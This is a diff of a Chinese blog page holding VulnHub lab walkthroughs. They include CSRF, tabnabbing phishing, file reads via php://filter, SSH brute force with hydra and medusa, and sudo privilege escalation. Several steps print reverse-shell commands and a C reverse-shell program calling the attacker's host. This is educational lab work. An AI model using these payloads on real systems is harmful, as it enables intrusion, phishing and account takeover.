-<li><p>用<a target="_blank" rel="noopener" href="http://archive.org/web/web.php">Wayback Machine</a>查看历史版本，只能说真牛逼<img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230924124522092.png" srcset="/img/loading.gif" lazyload alt="image-20230924124522092"></p>
+<li><p>用<a target="_blank" rel="noopener" href="http://archive.org/web/web.php">Wayback Machine</a>查看历史版本，只能说真牛逼<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230924124522092.png" srcset="/img/loading.gif" lazyload alt="image-20230924124522092"></p>
 </li>
-<li><p>写一份脚本跑一跑，发现之前幼稚了，既要iacon，又要首都，就很难受<img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230924131119001.png" srcset="/img/loading.gif" lazyload alt="image-20230924131119001"></p>
+<li><p>写一份脚本跑一跑，发现之前幼稚了，既要iacon，又要首都，就很难受<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230924131119001.png" srcset="/img/loading.gif" lazyload alt="image-20230924131119001"></p>
 </li>
 <li><p>ok,访问一下</p>
 <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Congrats On Getting Through <span class="hljs-keyword">the</span> First Stage!<br>Your Courage allowed us <span class="hljs-keyword">to</span> obtain <span class="hljs-number">2</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-number">4</span> keys!<br>Here <span class="hljs-keyword">is</span> your <span class="hljs-keyword">first</span> Flag: Flag1&#123;<span class="hljs-number">873</span>b375210b4297e9bdea1ed183c2da5&#125;<br>Bad News though :/ Megatron has <span class="hljs-number">2</span> <span class="hljs-keyword">of</span> keys <span class="hljs-keyword">at</span> his disposal. Prime <span class="hljs-keyword">and</span> Bumblebee got information <span class="hljs-keyword">from</span> Starscream, a traitor <span class="hljs-keyword">and</span> ex-commander <span class="hljs-keyword">for</span> Megatron <span class="hljs-keyword">about</span> secret <span class="hljs-built_in">item</span> he has hidden inside most expensive thing <span class="hljs-keyword">in</span> knockout&#x27;s shop. That <span class="hljs-built_in">item</span> has admin credentials.<br>Link <span class="hljs-keyword">to</span> shop: /W4RSHIP_Sh0P.php<br>Good Luck!<br><br>恭喜您通过第一阶段！<br>您的勇气让我们获得了 <span class="hljs-number">4</span> 把钥匙中的 <span class="hljs-number">2</span> 把！<br>这是您的第一个标志：Flag1&#123;<span class="hljs-number">873</span>b375210b4297e9bdea1ed183c2da5&#125;<br>坏消息：/威震天有 <span class="hljs-number">2</span> 把钥匙供他使用。Prime和大黄蜂从Starscream那里得到了信息，Starscream是威震天的叛徒和前指挥官，关于他藏在Knockout商店中最昂贵的东西里的秘密物品。该项目具有管理员凭据。<br>商店链接： /W4RSHIP_Sh0P.php<br>祝你好运！<br></code></pre></td></tr></table></figure>
 </li>
 <li><p>接着进入商店页面，经过观察可能存在csrf漏洞，有个转账功能，转账的发起人和接收人都是以参数的形式传递的，我们可以构造一段让网站管理员给我转账一万元的链接，发给管理员(网站”刚好”有一个发送邮件的功能而且管理员”刚好”会点击这个邮件)，于是我们可以购买后两个key</p>
 </li>
-<li><p><img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230924195118235.png" srcset="/img/loading.gif" lazyload alt="image-20230924195118235"></p>
+<li><p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230924195118235.png" srcset="/img/loading.gif" lazyload alt="image-20230924195118235"></p>
 </li>
 <li><pre><code class="hljs">网站管理员叫admin_boss（源码里翻到的）
 http://192.168.48.145/W4RSHIP_Sh0P_transfer.php?to=cxkcxk&amp;amount=100000&amp;from=lord_starscream 
@@ -514,7 +517,7 @@ sudo /usr/bin/vim /var/Deception/../../etc/sudoers
 <li><p>查看webbrowser库，发现任意用户可写入，于是修改open函数，添加<code>os.system(&#39;/bin/bash&#39;)</code>, 运行heist.py文件，得到arsene用户的shell</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo -u arsene <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/python3.9 /</span>home<span class="hljs-regexp">/arsene/</span>heist.py<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231007144216893.png" srcset="/img/loading.gif" lazyload alt="image-20231007144216893"></p>
+<p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231007144216893.png" srcset="/img/loading.gif" lazyload alt="image-20231007144216893"></p>
 </li>
 <li><p>下一步sudo pip提权</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span> -d)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="hljs-variable">$TF</span>/setup.py<br>sudo pip install <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure>
@@ -525,31 +528,31 @@ sudo /usr/bin/vim /var/Deception/../../etc/sudoers
 <h3 id="napping-1-0-1"><a href="#napping-1-0-1" class="headerlink" title="napping-1.0.1"></a>napping-1.0.1</h3><ol>
 <li><p>扫ip，端口发现22 8080</p>
 </li>
-<li><p>8080上运行一个登陆页面和一个输入框，管理员会点击我们输入的网址<img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008121235017.png" srcset="/img/loading.gif" lazyload alt="image-20231008121235017"></p>
+<li><p>8080上运行一个登陆页面和一个输入框，管理员会点击我们输入的网址<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008121235017.png" srcset="/img/loading.gif" lazyload alt="image-20231008121235017"></p>
 </li>
 <li><p>搜索得知此处可以利用 <code>标签钓鱼</code> 即 <code>TabNapping</code> ，我们利用kali上的一款社工工具 <code>setoolkit</code>，创建一个标签钓鱼网站</p>
 <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">此处调试软件废了不少功夫，大概的报错有两个：urllib has <span class="hljs-keyword">no</span> attribution named <span class="hljs-string">&#x27;urlopen&#x27;</span>; result <span class="hljs-number">404</span><br>搜索得到的解决方法为将 /usr/share/<span class="hljs-keyword">set</span>/src/webattack/tabnabbing/tabnabbing.py 中的<span class="hljs-comment">urllib.urlopen</span> 改为 <span class="hljs-comment">urllib.request.urlopen</span>， 并注释后续的五行代码<br>原理：python2中的 urllib 库存在<span class="hljs-comment">urlopen</span>方法，但是<span class="hljs-comment">python3</span>中将这个方法放在了<span class="hljs-comment">urllib.reequest</span>下；<span class="hljs-comment">404</span>的原因是目标网站可能并不存在图标，这里可以选择直接删除图标，也可以先判断是否存在再决定要不要添加图标<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008121558813.png" srcset="/img/loading.gif" lazyload alt="image-20231008121558813"></p>
+<p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008121558813.png" srcset="/img/loading.gif" lazyload alt="image-20231008121558813"></p>
 </li>
 <li><p>再自己写一个跳转网页，用python开一个http服务，把这个网页的url写进输入框，让管理员点击就会跳转到我们上面的钓鱼网站</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">boby</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">opener</span>) <span class="hljs-variable language_">window</span>.<span class="hljs-property">opener</span>.<span class="hljs-property">parent</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;http://192.168.1.15&#x27;</span>);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008123855027.png" srcset="/img/loading.gif" lazyload alt="image-20231008123855027"></p>
+<p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008123855027.png" srcset="/img/loading.gif" lazyload alt="image-20231008123855027"></p>
 </li>
 <li><p>ok，成功拿到管理员账号密码，我们尝试ssh登录，成功</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> daniel@<span class="hljs-number">192.168.1.33</span><br>password=C<span class="hljs-variable">@ughtm3napping123</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008131000426.png" srcset="/img/loading.gif" lazyload alt="image-20231008131000426"></p>
+<p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008131000426.png" srcset="/img/loading.gif" lazyload alt="image-20231008131000426"></p>
 </li>
 <li><p>接下来开始提权，sudo被禁用，查看可执行文件，发现在&#x2F;home&#x2F;adrian&#x2F;下存在一个py脚本文件，内容大概是记录日志，我们可以直接修改，查看日志发现两分钟执行一次，我们修改脚本代码为</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>os.system(<span class="hljs-string">&quot;/usr/bin/bash -c &#x27;/usr/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.15/8888&#x27; 0&gt;&amp;1&quot;</span>)<br></code></pre></td></tr></table></figure>
 </li>
-<li><p>同时在kali(192.168.1.15)监听8888端口，过了两分钟，成功拿到adrian的shell<img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008133315836.png" srcset="/img/loading.gif" lazyload alt="image-20231008133315836"></p>
+<li><p>同时在kali(192.168.1.15)监听8888端口，过了两分钟，成功拿到adrian的shell<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008133315836.png" srcset="/img/loading.gif" lazyload alt="image-20231008133315836"></p>
 </li>
-<li><p>接下来利用adrian提权，查看sudo -l<img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008133359694.png" srcset="/img/loading.gif" lazyload alt="image-20231008133359694"></p>
+<li><p>接下来利用adrian提权，查看sudo -l<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008133359694.png" srcset="/img/loading.gif" lazyload alt="image-20231008133359694"></p>
 </li>
-<li><p>ok ，sudo vim提权<img src="/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008133645461.png" srcset="/img/loading.gif" lazyload alt="image-20231008133645461"></p>
+<li><p>ok ，sudo vim提权<img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008133645461.png" srcset="/img/loading.gif" lazyload class title="image-20231008133645461"></p>
 </li>
 </ol>
 <h3 id="red1"><a href="#red1" class="headerlink" title="red1"></a>red1</h3><ol>
@@ -560,18 +563,18 @@ sudo /usr/bin/vim /var/Deception/../../etc/sudoers
 <li><p>咱们做两手准备，一方面用wpscan扫漏洞和爆破用户名密码，发现用户 <code>administrator</code> ，用rockyou字典进行密码爆破；另一方面读网页源码，发现提示 <code>Mr.miessler</code> ，经过搜索发现有个相关github项目中有php后门字典，我们利用 <code>dirb</code> 发现一个php后门 <code> /NetworkFileManagerPHP.php</code></p>
 </li>
 <li><p>访问 <code> /NetworkFileManagerPHP.php</code> 无回显，利用 <code>ffuf</code> 尝试爆破参数</p>
-<p>（这个过程中由于请求过快，导致靶机崩溃了，尝试了好几次都有问题😂）<img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019145058250.png" srcset="/img/loading.gif" lazyload alt="image-20231019145058250"></p>
+<p>（这个过程中由于请求过快，导致靶机崩溃了，尝试了好几次都有问题😂）<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019145058250.png" srcset="/img/loading.gif" lazyload alt="image-20231019145058250"></p>
 </li>
-<li><p>改用burp来爆破参数，这里用的字典<code>D:\tools\fuzzDicts-master\paramDict\parameter.txt</code><img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019154450410.png" srcset="/img/loading.gif" lazyload alt="image-20231019154450410"></p>
+<li><p>改用burp来爆破参数，这里用的字典<code>D:\tools\fuzzDicts-master\paramDict\parameter.txt</code><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019154450410.png" srcset="/img/loading.gif" lazyload alt="image-20231019154450410"></p>
 </li>
-<li><p>接下来测试这个后门是什么功能，已经输入的命令 <code>ls</code> ，无效，尝试输入一个文件地址 <code>/etc/passwd</code> ，很好，任意文件读取<img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019154846474.png" srcset="/img/loading.gif" lazyload alt="image-20231019154846474"></p>
+<li><p>接下来测试这个后门是什么功能，已经输入的命令 <code>ls</code> ，无效，尝试输入一个文件地址 <code>/etc/passwd</code> ，很好，任意文件读取<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019154846474.png" srcset="/img/loading.gif" lazyload alt="image-20231019154846474"></p>
 </li>
 <li><p>我们来测试一下是不是文件包含漏洞，使用</p>
 <figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">?<span class="hljs-built_in">key</span>=php://filter/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode/resource=NetworkFileManagerPHP.php<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019155326248.png" srcset="/img/loading.gif" lazyload alt="image-20231019155326248"></p>
+<p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019155326248.png" srcset="/img/loading.gif" lazyload alt="image-20231019155326248"></p>
 </li>
-<li><p>那好办了，解码后看看有没有过滤<img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019155445880.png" srcset="/img/loading.gif" lazyload alt="image-20231019155445880"></p>
+<li><p>那好办了，解码后看看有没有过滤<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019155445880.png" srcset="/img/loading.gif" lazyload alt="image-20231019155445880"></p>
 </li>
 <li><p>有点东西，虽然没有过滤，但是还有个注释，我们再解码一次</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw</span>==<br>That password alone won<span class="hljs-string">&#x27;t help you! Hashcat says rules are rules</span><br></code></pre></td></tr></table></figure>
@@ -579,32 +582,32 @@ sudo /usr/bin/vim /var/Deception/../../etc/sudoers
 <li><p>读取wp-config.php</p>
 <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=wp-config.php<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019161033785.png" srcset="/img/loading.gif" lazyload alt="image-20231019161033785"></p>
+<p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019161033785.png" srcset="/img/loading.gif" lazyload alt="image-20231019161033785"></p>
 <p>拿到账号 <code>john</code> 密码 <code>R3v_m4lwh3r3_k1nG!!</code>，直接尝试ssh，失败，密码错误</p>
 </li>
 <li><p>之前的注释提示要用hashcat的rule，我们bing一下</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">先将我们的密码放进一个base.txt文件，然后运行以下指令<br>hashcat <span class="hljs-attr">--stdout</span> base<span class="hljs-selector-class">.txt</span> -r /usr/share/hashcat/rules/best64<span class="hljs-selector-class">.rule</span> -o password.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019161907131.png" srcset="/img/loading.gif" lazyload alt="image-20231019161907131"></p>
+<p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019161907131.png" srcset="/img/loading.gif" lazyload alt="image-20231019161907131"></p>
 </li>
 <li><p>接下来我们用九头蛇或者美杜莎进行ssh爆破</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">九头蛇：<br>hydra -l john -P password<span class="hljs-selector-class">.txt</span> ssh:<span class="hljs-comment">//192.168.48.135</span><br>美杜莎：<br>medusa -h <span class="hljs-number">192.168</span>.<span class="hljs-number">48.135</span> -u john -P password<span class="hljs-selector-class">.txt</span> -M ssh<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019162547602.png" srcset="/img/loading.gif" lazyload alt="image-20231019162547602"></p>
-<p><img src="C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019162610010.png" srcset="/img/loading.gif" lazyload alt="image-20231019162610010"></p>
+<p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019162547602.png" srcset="/img/loading.gif" lazyload alt="image-20231019162547602"></p>
+<p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019162610010.png" srcset="/img/loading.gif" lazyload alt="image-20231019162610010"></p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> john@<span class="hljs-number">192.168.48.135</span><br><span class="hljs-attribute">R3v_m4lwh3r3_k1nG</span>!!<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure></li>
 </ol>
 <h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><ol>
-<li><p>ssh登录成功，但是刚连上就被踢掉了<img src="/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019162750514.png" srcset="/img/loading.gif" lazyload alt="image-20231019162750514"></p>
+<li><p>ssh登录成功，但是刚连上就被踢掉了<img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019162750514.png" srcset="/img/loading.gif" lazyload class title="image-20231019162750514"></p>
 </li>
-<li><p>我们重新爆破，发现密码已经被改<img src="/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019162857617.png" srcset="/img/loading.gif" lazyload alt="image-20231019162857617"></p>
+<li><p>我们重新爆破，发现密码已经被改<img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019162857617.png" srcset="/img/loading.gif" lazyload class title="image-20231019162857617"></p>
 </li>
-<li><p>再次尝试ssh连接，发现了一张给蓝队的小纸条，告诉我们<code>cat</code> 指令有问题(早就发现了，cat和vim互换)，同时 <code>sudo -l</code> 发现用户 <code>ippsec</code>可执行命令<code>usr/bin/time</code><img src="/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019163337680.png" srcset="/img/loading.gif" lazyload alt="image-20231019163337680"></p>
+<li><p>再次尝试ssh连接，发现了一张给蓝队的小纸条，告诉我们<code>cat</code> 指令有问题(早就发现了，cat和vim互换)，同时 <code>sudo -l</code> 发现用户 <code>ippsec</code>可执行命令<code>usr/bin/time</code><img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019163337680.png" srcset="/img/loading.gif" lazyload class title="image-20231019163337680"></p>
 </li>
 <li><p>利用其他用户命令执行和<code>time</code> 指令提权，可以跳转到 <code>ippsec</code> 用户</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo -u ippsec <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/time /</span>bin/sh<br></code></pre></td></tr></table></figure>
 
-<p><img src="/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019164601120.png" srcset="/img/loading.gif" lazyload alt="image-20231019164601120"></p>
+<img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019164601120.png" srcset="/img/loading.gif" lazyload class title="image-20231019164601120">
 </li>
 <li><p>这里发现切换用户后仍然会断开连接，于是返回上一步，直接反弹shell</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> -u ippsec /bin/time /bin/sh -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.48.129</span>/<span class="hljs-number">8888</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
@@ -612,12 +615,12 @@ sudo /usr/bin/vim /var/Deception/../../etc/sudoers
 <p>同时kali监听8888端口，成功拿到 <code>ippsec</code> 用户的shell且不会断开，利用python拿到交互式命令行</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure>
 </li>
-<li><p>到这一步没什么思路了，尝试上传提权脚本也提示无权限，经过搜索发现 <code>ippsec</code> 用户在 <code>/var/www/wordpress/.git</code> 目录下具有可写权限，于是我们在该目录尝试上传脏牛内核提权脚本，失败了，但是在该目录下发现了另一个c语言文件<img src="/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231020131018436.png" srcset="/img/loading.gif" lazyload alt="image-20231020131018436"></p>
+<li><p>到这一步没什么思路了，尝试上传提权脚本也提示无权限，经过搜索发现 <code>ippsec</code> 用户在 <code>/var/www/wordpress/.git</code> 目录下具有可写权限，于是我们在该目录尝试上传脏牛内核提权脚本，失败了，但是在该目录下发现了另一个c语言文件<img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231020131018436.png" srcset="/img/loading.gif" lazyload class title="image-20231020131018436"></p>
 </li>
 <li><p>似乎是用来踢下线前警告的程序，猜测是root身份运行的，修改内容为反弹shell的c代码</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dirent.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br> <br><span class="hljs-type">int</span> tcp_port = <span class="hljs-number">7777</span>;<br><span class="hljs-type">char</span> *ip = <span class="hljs-string">&quot;192.168.1.1&quot;</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rev_shell</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-type">int</span> fd;<br>        <span class="hljs-keyword">if</span> ( fork() &lt;= <span class="hljs-number">0</span>)&#123;<br>                <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> addr;<br>                addr.sin_family = AF_INET;<br>                addr.sin_port = <span class="hljs-built_in">htons</span>(tcp_port);<br>                addr.sin_addr.s_addr = <span class="hljs-built_in">inet_addr</span>(ip);<br> <br>                fd = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">connect</span>(fd, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;addr, <span class="hljs-built_in">sizeof</span>(addr)) )&#123;<br>                        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>                &#125;<br> <br>                <span class="hljs-built_in">dup2</span>(fd, <span class="hljs-number">0</span>);<br>                <span class="hljs-comment">//dup2(fd, 1);</span><br>                <span class="hljs-comment">//dup2(fd, 2);</span><br>                <span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span>;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> <span class="hljs-type">const</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-built_in">rev_shell</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 </li>
-<li><p>可惜这个代码反弹的shell只能执行命令不能看到回显，只能重新弹一个<img src="/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231020133345647.png" srcset="/img/loading.gif" lazyload alt="image-20231020133345647"></p>
+<li><p>可惜这个代码反弹的shell只能执行命令不能看到回显，只能重新弹一个<img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231020133345647.png" srcset="/img/loading.gif" lazyload class title="image-20231020133345647"></p>
 </li>
 </ol>
 <p>拿下</p>
